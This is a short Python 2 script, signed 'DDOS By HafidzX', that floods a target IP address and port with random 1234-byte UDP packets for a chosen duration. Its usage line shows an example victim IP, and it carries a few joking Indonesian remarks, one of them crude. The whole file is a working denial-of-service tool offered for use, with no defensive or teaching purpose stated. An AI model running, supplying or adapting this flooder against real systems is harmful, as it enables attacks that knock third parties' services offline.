 
import time
import socket
import random
import sys

def usage():
    print "Command: " + sys.argv[0] + " <3.235.171.149> <7777> <9999999>"
    print " subrek"
    print "Jan abuse anjeng "
    print "DDOS By HafidzX"

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1234 representes one byte to the server
    bytes = random._urandom(1234)
    timeout =  time.time() + duration
    sent = 999999

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "packet from HafidzX"

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

